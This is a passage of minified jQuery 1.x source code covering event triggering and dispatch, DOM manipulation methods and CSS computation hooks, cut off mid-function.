                                    l && !h.length && (d.teardown && !1 !== d.teardown.call(e, f, g.handle) || T.removeEvent(e, p, g.handle), delete u[p])
                                } else
                                    for (p in u) T.event.remove(e, p + t[c], i, n, !0);
                            T.isEmptyObject(u) && (delete g.handle, T._removeData(e, "events"))
                        }
                    },
                    trigger: function(e, t, i, n) {
                        var o, s, r, a, l, c, u, d = [i || f],
                            h = g.call(e, "type") ? e.type : e,
                            p = g.call(e, "namespace") ? e.namespace.split(".") : [];
                        if (r = c = i = i || f, 3 !== i.nodeType && 8 !== i.nodeType && !me.test(h + T.event.triggered) && (-1 < h.indexOf(".") && (h = (p = h.split(".")).shift(), p.sort()), s = h.indexOf(":") < 0 && "on" + h, (e = e[T.expando] ? e : new T.Event(h, "object" == typeof e && e)).isTrigger = n ? 2 : 3, e.namespace = p.join("."), e.rnamespace = e.namespace ? new RegExp("(^|\\.)" + p.join("\\.(?:.*\\.|)") + "(\\.|$)") : null, e.result = void 0, e.target || (e.target = i), t = null == t ? [e] : T.makeArray(t, [e]), l = T.event.special[h] || {}, n || !l.trigger || !1 !== l.trigger.apply(i, t))) {
                            if (!n && !l.noBubble && !T.isWindow(i)) {
                                for (a = l.delegateType || h, me.test(a + h) || (r = r.parentNode); r; r = r.parentNode) d.push(r), c = r;
                                c === (i.ownerDocument || f) && d.push(c.defaultView || c.parentWindow || C)
                            }
                            for (u = 0;
                                (r = d[u++]) && !e.isPropagationStopped();) e.type = 1 < u ? a : l.bindType || h, (o = (T._data(r, "events") || {})[e.type] && T._data(r, "handle")) && o.apply(r, t), (o = s && r[s]) && o.apply && P(r) && (e.result = o.apply(r, t), !1 === e.result && e.preventDefault());
                            if (e.type = h, !n && !e.isDefaultPrevented() && (!l._default || !1 === l._default.apply(d.pop(), t)) && P(i) && s && i[h] && !T.isWindow(i)) {
                                (c = i[s]) && (i[s] = null), T.event.triggered = h;
                                try {
                                    i[h]()
                                } catch (e) {}
                                T.event.triggered = void 0, c && (i[s] = c)
                            }
                            return e.result
                        }
                    },
                    dispatch: function(e) {
                        e = T.event.fix(e);
                        var t, i, n, o, s, r = [],
                            a = u.call(arguments),
                            l = (T._data(this, "events") || {})[e.type] || [],
                            c = T.event.special[e.type] || {};
                        if ((a[0] = e).delegateTarget = this, !c.preDispatch || !1 !== c.preDispatch.call(this, e)) {
                            for (r = T.event.handlers.call(this, e, l), t = 0;
                                (o = r[t++]) && !e.isPropagationStopped();)
                                for (e.currentTarget = o.elem, i = 0;
                                    (s = o.handlers[i++]) && !e.isImmediatePropagationStopped();) e.rnamespace && !e.rnamespace.test(s.namespace) || (e.handleObj = s, e.data = s.data, void 0 !== (n = ((T.event.special[s.origType] || {}).handle || s.handler).apply(o.elem, a)) && !1 === (e.result = n) && (e.preventDefault(), e.stopPropagation()));
                            return c.postDispatch && c.postDispatch.call(this, e), e.result
                        }
                    },
                    handlers: function(e, t) {
                        var i, n, o, s, r = [],
                            a = t.delegateCount,
                            l = e.target;
                        if (a && l.nodeType && ("click" !== e.type || isNaN(e.button) || e.button < 1))
                            for (; l != this; l = l.parentNode || this)
                                if (1 === l.nodeType && (!0 !== l.disabled || "click" !== e.type)) {
                                    for (n = [], i = 0; i < a; i++) void 0 === n[o = (s = t[i]).selector + " "] && (n[o] = s.needsContext ? -1 < T(o, this).index(l) : T.find(o, this, null, [l]).length), n[o] && n.push(s);
                                    n.length && r.push({
                                        elem: l,
                                        handlers: n
                                    })
                                }
                        return a < t.length && r.push({
                            elem: this,
                            handlers: t.slice(a)
                        }), r
                    },
                    fix: function(e) {
                        if (e[T.expando]) return e;
                        var t, i, n, o = e.type,
                            s = e,
                            r = this.fixHooks[o];
                        for (r || (this.fixHooks[o] = r = fe.test(o) ? this.mouseHooks : pe.test(o) ? this.keyHooks : {}), n = r.props ? this.props.concat(r.props) : this.props, e = new T.Event(s), t = n.length; t--;) e[i = n[t]] = s[i];
                        return e.target || (e.target = s.srcElement || f), 3 === e.target.nodeType && (e.target = e.target.parentNode), e.metaKey = !!e.metaKey, r.filter ? r.filter(e, s) : e
                    },
                    props: "altKey bubbles cancelable ctrlKey currentTarget detail eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),
                    fixHooks: {},
                    keyHooks: {
                        props: "char charCode key keyCode".split(" "),
                        filter: function(e, t) {
                            return null == e.which && (e.which = null != t.charCode ? t.charCode : t.keyCode), e
                        }
                    },
                    mouseHooks: {
                        props: "button buttons clientX clientY fromElement offsetX offsetY pageX pageY screenX screenY toElement".split(" "),
                        filter: function(e, t) {
                            var i, n, o, s = t.button,
                                r = t.fromElement;
                            return null == e.pageX && null != t.clientX && (o = (n = e.target.ownerDocument || f).documentElement, i = n.body, e.pageX = t.clientX + (o && o.scrollLeft || i && i.scrollLeft || 0) - (o && o.clientLeft || i && i.clientLeft || 0), e.pageY = t.clientY + (o && o.scrollTop || i && i.scrollTop || 0) - (o && o.clientTop || i && i.clientTop || 0)), !e.relatedTarget && r && (e.relatedTarget = r === e.target ? t.toElement : r), e.which || void 0 === s || (e.which = 1 & s ? 1 : 2 & s ? 3 : 4 & s ? 2 : 0), e
                        }
                    },
                    special: {
                        load: {
                            noBubble: !0
                        },
                        focus: {
                            trigger: function() {
                                if (this !== be() && this.focus) try {
                                    return this.focus(), !1
                                } catch (e) {}
                            },
                            delegateType: "focusin"
                        },
                        blur: {
                            trigger: function() {
                                return this === be() && this.blur ? (this.blur(), !1) : void 0
                            },
                            delegateType: "focusout"
                        },
                        click: {
                            trigger: function() {
                                return T.nodeName(this, "input") && "checkbox" === this.type && this.click ? (this.click(), !1) : void 0
                            },
                            _default: function(e) {
                                return T.nodeName(e.target, "a")
                            }
                        },
                        beforeunload: {
                            postDispatch: function(e) {
                                void 0 !== e.result && e.originalEvent && (e.originalEvent.returnValue = e.result)
                            }
                        }
                    },
                    simulate: function(e, t, i) {
                        var n = T.extend(new T.Event, i, {
                            type: e,
                            isSimulated: !0
                        });
                        T.event.trigger(n, null, t), n.isDefaultPrevented() && i.preventDefault()
                    }
                }, T.removeEvent = f.removeEventListener ? function(e, t, i) {
                    e.removeEventListener && e.removeEventListener(t, i)
                } : function(e, t, i) {
                    var n = "on" + t;
                    e.detachEvent && (void 0 === e[n] && (e[n] = null), e.detachEvent(n, i))
                }, T.Event = function(e, t) {
                    return this instanceof T.Event ? (e && e.type ? (this.originalEvent = e, this.type = e.type, this.isDefaultPrevented = e.defaultPrevented || void 0 === e.defaultPrevented && !1 === e.returnValue ? ve : ye) : this.type = e, t && T.extend(this, t), this.timeStamp = e && e.timeStamp || T.now(), void(this[T.expando] = !0)) : new T.Event(e, t)
                }, T.Event.prototype = {
                    constructor: T.Event,
                    isDefaultPrevented: ye,
                    isPropagationStopped: ye,
                    isImmediatePropagationStopped: ye,
                    preventDefault: function() {
                        var e = this.originalEvent;
                        this.isDefaultPrevented = ve, e && (e.preventDefault ? e.preventDefault() : e.returnValue = !1)
                    },
                    stopPropagation: function() {
                        var e = this.originalEvent;
                        this.isPropagationStopped = ve, e && !this.isSimulated && (e.stopPropagation && e.stopPropagation(), e.cancelBubble = !0)
                    },
                    stopImmediatePropagation: function() {
                        var e = this.originalEvent;
                        this.isImmediatePropagationStopped = ve, e && e.stopImmediatePropagation && e.stopImmediatePropagation(), this.stopPropagation()
                    }
                }, T.each({
                    mouseenter: "mouseover",
                    mouseleave: "mouseout",
                    pointerenter: "pointerover",
                    pointerleave: "pointerout"
                }, function(e, o) {
                    T.event.special[e] = {
                        delegateType: o,
                        bindType: o,
                        handle: function(e) {
                            var t, i = e.relatedTarget,
                                n = e.handleObj;
                            return i && (i === this || T.contains(this, i)) || (e.type = n.origType, t = n.handler.apply(this, arguments), e.type = o), t
                        }
                    }
                }), v.submit || (T.event.special.submit = {
                    setup: function() {
                        return !T.nodeName(this, "form") && void T.event.add(this, "click._submit keypress._submit", function(e) {
                            var t = e.target,
                                i = T.nodeName(t, "input") || T.nodeName(t, "button") ? T.prop(t, "form") : void 0;
                            i && !T._data(i, "submit") && (T.event.add(i, "submit._submit", function(e) {
                                e._submitBubble = !0
                            }), T._data(i, "submit", !0))
                        })
                    },
                    postDispatch: function(e) {
                        e._submitBubble && (delete e._submitBubble, this.parentNode && !e.isTrigger && T.event.simulate("submit", this.parentNode, e))
                    },
                    teardown: function() {
                        return !T.nodeName(this, "form") && void T.event.remove(this, "._submit")
                    }
                }), v.change || (T.event.special.change = {
                    setup: function() {
                        return he.test(this.nodeName) ? ("checkbox" !== this.type && "radio" !== this.type || (T.event.add(this, "propertychange._change", function(e) {
                            "checked" === e.originalEvent.propertyName && (this._justChanged = !0)
                        }), T.event.add(this, "click._change", function(e) {
                            this._justChanged && !e.isTrigger && (this._justChanged = !1), T.event.simulate("change", this, e)
                        })), !1) : void T.event.add(this, "beforeactivate._change", function(e) {
                            var t = e.target;
                            he.test(t.nodeName) && !T._data(t, "change") && (T.event.add(t, "change._change", function(e) {
                                !this.parentNode || e.isSimulated || e.isTrigger || T.event.simulate("change", this.parentNode, e)
                            }), T._data(t, "change", !0))
                        })
                    },
                    handle: function(e) {
                        var t = e.target;
                        return this !== t || e.isSimulated || e.isTrigger || "radio" !== t.type && "checkbox" !== t.type ? e.handleObj.handler.apply(this, arguments) : void 0
                    },
                    teardown: function() {
                        return T.event.remove(this, "._change"), !he.test(this.nodeName)
                    }
                }), v.focusin || T.each({
                    focus: "focusin",
                    blur: "focusout"
                }, function(i, n) {
                    var o = function(e) {
                        T.event.simulate(n, e.target, T.event.fix(e))
                    };
                    T.event.special[n] = {
                        setup: function() {
                            var e = this.ownerDocument || this,
                                t = T._data(e, n);
                            t || e.addEventListener(i, o, !0), T._data(e, n, (t || 0) + 1)
                        },
                        teardown: function() {
                            var e = this.ownerDocument || this,
                                t = T._data(e, n) - 1;
                            t ? T._data(e, n, t) : (e.removeEventListener(i, o, !0), T._removeData(e, n))
                        }
                    }
                }), T.fn.extend({
                    on: function(e, t, i, n) {
                        return we(this, e, t, i, n)
                    },
                    one: function(e, t, i, n) {
                        return we(this, e, t, i, n, 1)
                    },
                    off: function(e, t, i) {
                        var n, o;
                        if (e && e.preventDefault && e.handleObj) return n = e.handleObj, T(e.delegateTarget).off(n.namespace ? n.origType + "." + n.namespace : n.origType, n.selector, n.handler), this;
                        if ("object" != typeof e) return !1 !== t && "function" != typeof t || (i = t, t = void 0), !1 === i && (i = ye), this.each(function() {
                            T.event.remove(this, e, i, t)
                        });
                        for (o in e) this.off(o, t, e[o]);
                        return this
                    },
                    trigger: function(e, t) {
                        return this.each(function() {
                            T.event.trigger(e, t, this)
                        })
                    },
                    triggerHandler: function(e, t) {
                        var i = this[0];
                        return i ? T.event.trigger(e, t, i, !0) : void 0
                    }
                });
                var xe = / jQuery\d+="(?:null|\d+)"/g,
                    _e = new RegExp("<(?:" + ne + ")[\\s/>]", "i"),
                    Ce = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:-]+)[^>]*)\/>/gi,
                    Te = /<script|<style|<link/i,
                    ke = /checked\s*(?:[^=]|=\s*.checked.)/i,
                    $e = /^true\/(.*)/,
                    Ee = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g,
                    Se = oe(f).appendChild(f.createElement("div"));

                function Ae(e, t) {
                    return T.nodeName(e, "table") && T.nodeName(11 !== t.nodeType ? t : t.firstChild, "tr") ? e.getElementsByTagName("tbody")[0] || e.appendChild(e.ownerDocument.createElement("tbody")) : e
                }

                function De(e) {
                    return e.type = (null !== T.find.attr(e, "type")) + "/" + e.type, e
                }

                function je(e) {
                    var t = $e.exec(e.type);
                    return t ? e.type = t[1] : e.removeAttribute("type"), e
                }

                function Ne(e, t) {
                    if (1 === t.nodeType && T.hasData(e)) {
                        var i, n, o, s = T._data(e),
                            r = T._data(t, s),
                            a = s.events;
                        if (a)
                            for (i in delete r.handle, r.events = {}, a)
                                for (n = 0, o = a[i].length; n < o; n++) T.event.add(t, i, a[i][n]);
                        r.data && (r.data = T.extend({}, r.data))
                    }
                }

                function Le(e, t) {
                    var i, n, o;
                    if (1 === t.nodeType) {
                        if (i = t.nodeName.toLowerCase(), !v.noCloneEvent && t[T.expando]) {
                            for (n in (o = T._data(t)).events) T.removeEvent(t, n, o.handle);
                            t.removeAttribute(T.expando)
                        }
                        "script" === i && t.text !== e.text ? (De(t).text = e.text, je(t)) : "object" === i ? (t.parentNode && (t.outerHTML = e.outerHTML), v.html5Clone && e.innerHTML && !T.trim(t.innerHTML) && (t.innerHTML = e.innerHTML)) : "input" === i && K.test(e.type) ? (t.defaultChecked = t.checked = e.checked, t.value !== e.value && (t.value = e.value)) : "option" === i ? t.defaultSelected = t.selected = e.defaultSelected : "input" !== i && "textarea" !== i || (t.defaultValue = e.defaultValue)
                    }
                }

                function ze(i, n, o, s) {
                    n = m.apply([], n);
                    var e, t, r, a, l, c, u = 0,
                        d = i.length,
                        h = d - 1,
                        p = n[0],
                        f = T.isFunction(p);
                    if (f || 1 < d && "string" == typeof p && !v.checkClone && ke.test(p)) return i.each(function(e) {
                        var t = i.eq(e);
                        f && (n[0] = p.call(this, e, t.html())), ze(t, n, o, s)
                    });
                    if (d && (e = (c = de(n, i[0].ownerDocument, !1, i, s)).firstChild, 1 === c.childNodes.length && (c = e), e || s)) {
                        for (r = (a = T.map(re(c, "script"), De)).length; u < d; u++) t = c, u !== h && (t = T.clone(t, !0, !0), r && T.merge(a, re(t, "script"))), o.call(i[u], t, u);
                        if (r)
                            for (l = a[a.length - 1].ownerDocument, T.map(a, je), u = 0; u < r; u++) t = a[u], te.test(t.type || "") && !T._data(t, "globalEval") && T.contains(l, t) && (t.src ? T._evalUrl && T._evalUrl(t.src) : T.globalEval((t.text || t.textContent || t.innerHTML || "").replace(Ee, "")));
                        c = e = null
                    }
                    return i
                }

                function Me(e, t, i) {
                    for (var n, o = t ? T.filter(t, e) : e, s = 0; null != (n = o[s]); s++) i || 1 !== n.nodeType || T.cleanData(re(n)), n.parentNode && (i && T.contains(n.ownerDocument, n) && ae(re(n, "script")), n.parentNode.removeChild(n));
                    return e
                }
                T.extend({
                    htmlPrefilter: function(e) {
                        return e.replace(Ce, "<$1></$2>")
                    },
                    clone: function(e, t, i) {
                        var n, o, s, r, a, l = T.contains(e.ownerDocument, e);
                        if (v.html5Clone || T.isXMLDoc(e) || !_e.test("<" + e.nodeName + ">") ? s = e.cloneNode(!0) : (Se.innerHTML = e.outerHTML, Se.removeChild(s = Se.firstChild)), !(v.noCloneEvent && v.noCloneChecked || 1 !== e.nodeType && 11 !== e.nodeType || T.isXMLDoc(e)))
                            for (n = re(s), a = re(e), r = 0; null != (o = a[r]); ++r) n[r] && Le(o, n[r]);
                        if (t)
                            if (i)
                                for (a = a || re(e), n = n || re(s), r = 0; null != (o = a[r]); r++) Ne(o, n[r]);
                            else Ne(e, s);
                        return 0 < (n = re(s, "script")).length && ae(n, !l && re(e, "script")), n = a = o = null, s
                    },
                    cleanData: function(e, t) {
                        for (var i, n, o, s, r = 0, a = T.expando, l = T.cache, c = v.attributes, u = T.event.special; null != (i = e[r]); r++)
                            if ((t || P(i)) && (s = (o = i[a]) && l[o])) {
                                if (s.events)
                                    for (n in s.events) u[n] ? T.event.remove(i, n) : T.removeEvent(i, n, s.handle);
                                l[o] && (delete l[o], c || void 0 === i.removeAttribute ? i[a] = void 0 : i.removeAttribute(a), d.push(o))
                            }
                    }
                }), T.fn.extend({
                    domManip: ze,
                    detach: function(e) {
                        return Me(this, e, !0)
                    },
                    remove: function(e) {
                        return Me(this, e)
                    },
                    text: function(e) {
                        return Z(this, function(e) {
                            return void 0 === e ? T.text(this) : this.empty().append((this[0] && this[0].ownerDocument || f).createTextNode(e))
                        }, null, e, arguments.length)
                    },
                    append: function() {
                        return ze(this, arguments, function(e) {
                            1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || Ae(this, e).appendChild(e)
                        })
                    },
                    prepend: function() {
                        return ze(this, arguments, function(e) {
                            if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) {
                                var t = Ae(this, e);
                                t.insertBefore(e, t.firstChild)
                            }
                        })
                    },
                    before: function() {
                        return ze(this, arguments, function(e) {
                            this.parentNode && this.parentNode.insertBefore(e, this)
                        })
                    },
                    after: function() {
                        return ze(this, arguments, function(e) {
                            this.parentNode && this.parentNode.insertBefore(e, this.nextSibling)
                        })
                    },
                    empty: function() {
                        for (var e, t = 0; null != (e = this[t]); t++) {
                            for (1 === e.nodeType && T.cleanData(re(e, !1)); e.firstChild;) e.removeChild(e.firstChild);
                            e.options && T.nodeName(e, "select") && (e.options.length = 0)
                        }
                        return this
                    },
                    clone: function(e, t) {
                        return e = null != e && e, t = null == t ? e : t, this.map(function() {
                            return T.clone(this, e, t)
                        })
                    },
                    html: function(e) {
                        return Z(this, function(e) {
                            var t = this[0] || {},
                                i = 0,
                                n = this.length;
                            if (void 0 === e) return 1 === t.nodeType ? t.innerHTML.replace(xe, "") : void 0;
                            if ("string" == typeof e && !Te.test(e) && (v.htmlSerialize || !_e.test(e)) && (v.leadingWhitespace || !ie.test(e)) && !se[(ee.exec(e) || ["", ""])[1].toLowerCase()]) {
                                e = T.htmlPrefilter(e);
                                try {
                                    for (; i < n; i++) 1 === (t = this[i] || {}).nodeType && (T.cleanData(re(t, !1)), t.innerHTML = e);
                                    t = 0
                                } catch (e) {}
                            }
                            t && this.empty().append(e)
                        }, null, e, arguments.length)
                    },
                    replaceWith: function() {
                        var i = [];
                        return ze(this, arguments, function(e) {
                            var t = this.parentNode;
                            T.inArray(this, i) < 0 && (T.cleanData(re(this)), t && t.replaceChild(e, this))
                        }, i)
                    }
                }), T.each({
                    appendTo: "append",
                    prependTo: "prepend",
                    insertBefore: "before",
                    insertAfter: "after",
                    replaceAll: "replaceWith"
                }, function(e, r) {
                    T.fn[e] = function(e) {
                        for (var t, i = 0, n = [], o = T(e), s = o.length - 1; i <= s; i++) t = i === s ? this : this.clone(!0), T(o[i])[r](t), a.apply(n, t.get());
                        return this.pushStack(n)
                    }
                });
                var qe, Pe = {
                    HTML: "block",
                    BODY: "block"
                };

                function Oe(e, t) {
                    var i = T(t.createElement(e)).appendTo(t.body),
                        n = T.css(i[0], "display");
                    return i.detach(), n
                }

                function Fe(e) {
                    var t = f,
                        i = Pe[e];
                    return i || ("none" !== (i = Oe(e, t)) && i || ((t = ((qe = (qe || T("<iframe frameborder='0' width='0' height='0'/>")).appendTo(t.documentElement))[0].contentWindow || qe[0].contentDocument).document).write(), t.close(), i = Oe(e, t), qe.detach()), Pe[e] = i), i
                }
                var He = /^margin/,
                    Be = new RegExp("^(" + W + ")(?!px)[a-z%]+$", "i"),
                    Ie = function(e, t, i, n) {
                        var o, s, r = {};
                        for (s in t) r[s] = e.style[s], e.style[s] = t[s];
                        for (s in o = i.apply(e, n || []), t) e.style[s] = r[s];
                        return o
                    },
                    Re = f.documentElement;
                ! function() {
                    var n, o, s, r, a, l, c = f.createElement("div"),
                        u = f.createElement("div");
                    if (u.style) {
                        function e() {
                            var e, t, i = f.documentElement;
                            i.appendChild(c), u.style.cssText = "-webkit-box-sizing:border-box;box-sizing:border-box;position:relative;display:block;margin:auto;border:1px;padding:1px;top:1%;width:50%", n = s = l = !1, o = a = !0, C.getComputedStyle && (t = C.getComputedStyle(u), n = "1%" !== (t || {}).top, l = "2px" === (t || {}).marginLeft, s = "4px" === (t || {
                                width: "4px"
                            }).width, u.style.marginRight = "50%", o = "4px" === (t || {
                                marginRight: "4px"
                            }).marginRight, (e = u.appendChild(f.createElement("div"))).style.cssText = u.style.cssText = "-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:0", e.style.marginRight = e.style.width = "0", u.style.width = "1px", a = !parseFloat((C.getComputedStyle(e) || {}).marginRight), u.removeChild(e)), u.style.display = "none", (r = 0 === u.getClientRects().length) && (u.style.display = "", u.innerHTML = "<table><tr><td></td><td>t</td></tr></table>", u.childNodes[0].style.borderCollapse = "separate", (e = u.getElementsByTagName("td"))[0].style.cssText = "margin:0;border:0;padding:0;display:none", (r = 0 === e[0].offsetHeight) && (e[0].style.display = "", e[1].style.display = "none", r = 0 === e[0].offsetHeight)), i.removeChild(c)
                        }
                        u.style.cssText = "float:left;opacity:.5", v.opacity = "0.5" === u.style.opacity, v.cssFloat = !!u.style.cssFloat, u.style.backgroundClip = "content-box", u.cloneNode(!0).style.backgroundClip = "", v.clearCloneStyle = "content-box" === u.style.backgroundClip, (c = f.createElement("div")).style.cssText = "border:0;width:8px;height:0;top:0;left:-9999px;padding:0;margin-top:1px;position:absolute", u.innerHTML = "", c.appendChild(u), v.boxSizing = "" === u.style.boxSizing || "" === u.style.MozBoxSizing || "" === u.style.WebkitBoxSizing, T.extend(v, {
                            reliableHiddenOffsets: function() {
                                return null == n && e(), r
                            },
                            boxSizingReliable: function() {
                                return null == n && e(), s
                            },
                            pixelMarginRight: function() {
                                return null == n && e(), o
                            },
                            pixelPosition: function() {
                                return null == n && e(), n
                            },
                            reliableMarginRight: function() {
                                return null == n && e(), a
                            },
                            reliableMarginLeft: function() {
                                return null == n && e(), l
                            }
                        })
                    }
                }();
                var We, Ve, Xe = /^(top|right|bottom|left)$/;

                function Ge(e, t) {
                    return {
                        get: function() {
                            return e() ? void delete this.get : (this.get = t).apply(this, arguments)
                        }
                    }
                }
                C.getComputedStyle ? (We = function(e) {
                    var t = e.ownerDocument.defaultView;
                    return t && t.opener || (t = C), t.getComputedStyle(e)
                }, Ve = function(e, t, i) {
                    var n, o, s, r, a = e.style;
                    return "" !== (r = (i = i || We(e)) ? i.getPropertyValue(t) || i[t] : void 0) && void 0 !== r || T.contains(e.ownerDocument, e) || (r = T.style(e, t)), i && !v.pixelMarginRight() && Be.test(r) && He.test(t) && (n = a.width, o = a.minWidth, s = a.maxWidth, a.minWidth = a.maxWidth = a.width = r, r = i.width, a.width = n, a.minWidth = o, a.maxWidth = s), void 0 === r ? r : r + ""
                }) : Re.currentStyle && (We = function(e) {
                    return e.currentStyle
                }, Ve = function(e, t, i) {
                    var n, o, s, r, a = e.style;
                    return null == (r = (i = i || We(e)) ? i[t] : void 0) && a && a[t] && (r = a[t]), Be.test(r) && !Xe.test(t) && (n = a.left, (s = (o = e.runtimeStyle) && o.left) && (o.left = e.currentStyle.left), a.left = "fontSize" === t ? "1em" : r, r = a.pixelLeft + "px", a.left = n, s && (o.left = s)), void 0 === r ? r : r + "" || "auto"
                });
                var Ue = /alpha\([^)]*\)/i,
                    Qe = /opacity\s*=\s*([^)]*)/i,
                    Ye = /^(none|table(?!-c[ea]).+)/,
                    Je = new RegExp("^(" + W + ")(.*)$", "i"),
                    Ze = {
                        position: "absolute",
                        visibility: "hidden",
                        display: "block"
                    },
                    Ke = {
                        letterSpacing: "0",
                        fontWeight: "400"
                    },
                    et = ["Webkit", "O", "Moz", "ms"],
                    tt = f.createElement("div").style;

                function it(e) {
                    if (e in tt) return e;
                    for (var t = e.charAt(0).toUpperCase() + e.slice(1), i = et.length; i--;)
                        if ((e = et[i] + t) in tt) return e
                }

                function nt(e, t) {
                    for (var i, n, o, s = [], r = 0, a = e.length; r < a; r++)(n = e[r]).style && (s[r] = T._data(n, "olddisplay"), i = n.style.display, t ? (s[r] || "none" !== i || (n.style.display = ""), "" === n.style.display && G(n) && (s[r] = T._data(n, "olddisplay", Fe(n.nodeName)))) : (o = G(n), (i && "none" !== i || !o) && T._data(n, "olddisplay", o ? i : T.css(n, "display"))));
                    for (r = 0; r < a; r++)(n = e[r]).style && (t && "none" !== n.style.display && "" !== n.style.display || (n.style.display = t ? s[r] || "" : "none"));
                    return e
                }

                function ot(e, t, i) {
                    var n = Je.exec(t);
                    return n ? Math.max(0, n[1] - (i || 0)) + (n[2] || "px") : t
                }

                function st(e, t, i, n, o) {
                    for (var s = i === (n ? "border" : "content") ? 4 : "width" === t ? 1 : 0, r = 0; s < 4; s += 2) "margin" === i && (r += T.css(e, i + X[s], !0, o)), n ? ("content" === i && (r -= T.css(e, "padding" + X[s], !0, o)), "margin" !== i && (r -= T.css(e, "border" + X[s] + "Width", !0, o))) : (r += T.css(e, "padding" + X[s], !0, o), "padding" !== i && (r += T.css(e, "border" + X[s] + "Width", !0, o)));
                    return r
                }

                function rt(e, t, i) {
                    var n = !0,
                        o = "width" === t ? e.offsetWidth : e.offsetHeight,
                        s = We(e),
                        r = v.boxSizing && "border-box" === T.css(e, "boxSizing", !1, s);
                    if (o <= 0 || null == o) {
                        if (((o = Ve(e, t, s)) < 0 || null == o) && (o = e.style[t]), Be.test(o)) return o;
                        n = r && (v.boxSizingReliable() || o === e.style[t]), o = parseFloat(o) || 0
                    }
                    return o + st(e, t, i || (r ? "border" : "content"), n, s) + "px"
                }

                function at(e, t, i, n, o) {
                    return new at.prototype.init(e, t, i, n, o)
                }
                T.extend({
                    cssHooks: {
                        opacity: {
                            get: function(e, t) {
                                if (t) {
                                    var i = Ve(e, "opacity");
                                    return "" === i ? "1" : i
                                }
                            }
                        }
                    },
                    cssNumber: {
                        animationIterationCount: !0,
                        columnCount: !0,
                        fillOpacity: !0,
                        flexGrow: !0,
                        flexShrink: !0,
                        fontWeight: !0,
                        lineHeight: !0,
                        opacity: !0,
                        order: !0,
                        orphans: !0,
                        widows: !0,
                        zIndex: !0,
                        zoom: !0
                    },
                    cssProps: {
                        float: v.cssFloat ? "cssFloat" : "styleFloat"
                    },
                    style: function(e, t, i, n) {
                        if (e && 3 !== e.nodeType && 8 !== e.nodeType && e.style) {
                            var o, s, r, a = T.camelCase(t),
                                l = e.style;
                            if (t = T.cssProps[a] || (T.cssProps[a] = it(a) || a), r = T.cssHooks[t] || T.cssHooks[a], void 0 === i) return r && "get" in r && void 0 !== (o = r.get(e, !1, n)) ? o : l[t];
                            if ("string" === (s = typeof i) && (o = V.exec(i)) && o[1] && (i = U(e, t, o), s = "number"), null != i && i == i && ("number" === s && (i += o && o[3] || (T.cssNumber[a] ? "" : "px")), v.clearCloneStyle || "" !== i || 0 !== t.indexOf("background") || (l[t] = "inherit"), !(r && "set" in r && void 0 === (i = r.set(e, i, n))))) try {
                                l[t] = i
                            } catch (e) {}
                        }
                    },
                    css: function(e, t, i, n) {
                        var o, s, r, a = T.camelCase(t);
                        return t = T.cssProps[a] || (T.cssProps[a] = it(a) || a), (r = T.cssHooks[t] || T.cssHooks[a]) && "get" in r && (s = r.get(e, !0, i)), void 0 === s && (s = Ve(e, t, n)), "normal" === s && t in Ke && (s = Ke[t]), "" === i || i ? (o = parseFloat(s), !0 === i || isFinite(o) ? o || 0 : s) : s
                    }
                }), T.each(["height", "width"], function(e, o) {
                    T.cssHooks[o] = {
                        get: function(e, t, i) {
                            return t ? Ye.test(T.css(e, "display")) && 0 === e.offsetWidth ? Ie(e, Ze, function() {
                                return rt(e, o, i)
                            }) : rt(e, o, i) : void 0
                        },
                        set: function(e, t, i) {
                            var n = i && We(e);
                            return ot(0, t, i ? st(e, o, i, v.boxSizing && "border-box" === T.css(e, "boxSizing", !1, n), n) : 0)
                        }
                    }
                }), v.opacity || (T.cssHooks.opacity = {
                    get: function(e, t) {
                        return Qe.test((t && e.currentStyle ? e.currentStyle.filter : e.style.filter) || "") ? .01 * parseFloat(RegExp.$1) + "" : t ? "1" : ""
                    },
                    set: function(e, t) {
                        var i = e.style,
                            n = e.currentStyle,
                            o = T.isNumeric(t) ? "alpha(opacity=" + 100 * t + ")" : "",
                            s = n && n.filter || i.filter || "";
                        ((i.zoom = 1) <= t || "" === t) && "" === T.trim(s.replace(Ue, "")) && i.removeAttribute && (i.removeAttribute("filter"), "" === t || n && !n.filter) || (i.filter = Ue.test(s) ? s.replace(Ue, o) : s + " " + o)
                    }
                }), T.cssHooks.marginRight = Ge(v.reliableMarginRight, function(e, t) {
                    return t ? Ie(e, {
                        display: "inline-block"
                    }, Ve, [e, "marginRight"]) : void 0
                }), T.cssHooks.marginLeft = Ge(v.reliableMarginLeft, function(e, t) {
                    return t ? (parseFloat(Ve(e, "marginLeft")) || (T.contains(e.ownerDocument, e) ? e.getBoundingClientRect().left - Ie(e, {
                        marginLeft: 0
                    }, function() {
                        return e.getBoundingClientRect().left
                    }) : 0)) + "px" : void 0
                }), T.each({
                    margin: "",
                    padding: "",
                    border: "Width"
                }, function(o, s) {
                    T.cssHooks[o + s] = {
                        expand: function(e) {
                            for (var t = 0, i = {}, n = "string" == typeof e ? e.split(" ") : [e]; t < 4; t++) i[o + X[t] + s] = n[t] || n[t - 2] || n[0];
                            return i
                        }
                    }, He.test(o) || (T.cssHooks[o + s].set = ot)
                }), T.fn.extend({
                    css: function(e, t) {
                        return Z(this, function(e, t, i) {
                            var n, o, s = {},
                                r = 0;
                            if (T.isArray(t)) {
                                for (n = We(e), o = t.length; r < o; r++) s[t[r]] = T.css(e, t[r], !1, n);
                                return s
                            }
                            return void 0 !== i ? T.style(e, t, i) : T.css(e, t)
                        }, e, t, 1 < arguments.length)
                    },
                    show: function() {
                        return nt(this, !0)
                    },
                    hide: function() {
                        return nt(this)
                    },
                    toggle: function(e) {
                        return "boolean" == typeof e ? e ? this.show() : this.hide() : this.each(function() {
                            G(this) ? T(this).show() : T(this).hide()
                        })
                    }
                }), ((T.Tween = at).prototype = {
                    constructor: at,
                    init: function(e, t, i, n, o, s) {
                        this.elem = e, this.prop = i, this.easing = o || T.easing._default, this.options = t, this.start = this.now = this.cur(), this.end = n, this.unit = s || (T.cssNumber[i] ? "" : "px")
                    },
                    cur: function() {
                        var e = at.propHooks[this.prop];
                        return e && e.get ? e.get(this) : at.propHooks._default.get(this)
                    },
                    run: function(e) {
                        var t, i = at.propHooks[this.prop];
